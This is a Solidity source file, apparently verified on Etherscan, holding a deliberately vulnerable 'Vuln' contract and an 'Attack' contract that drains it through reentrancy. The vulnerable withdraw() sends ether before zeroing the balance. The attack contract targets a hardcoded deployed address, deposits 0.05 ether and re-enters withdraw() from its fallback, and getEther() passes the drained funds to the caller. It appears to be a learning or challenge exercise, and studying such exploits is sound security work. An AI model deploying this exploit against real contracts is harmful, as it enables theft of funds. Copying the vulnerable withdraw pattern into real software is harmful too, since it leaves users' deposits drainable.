/**
 *Submitted for verification at Etherscan.io on 2022-12-06
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}


contract Attack {

  Vuln public vuln = Vuln(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d);
  uint256 public i = 1;

  
  function attack() public payable {

      vuln.deposit.value(0.05 ether)();
      vuln.withdraw();

  }

  fallback () external payable{
      if(i<3)
      {
          i=i+1;
          vuln.withdraw();
      }
  }
  
  function getEther() public{
      msg.sender.transfer(address(this).balance);
  }

}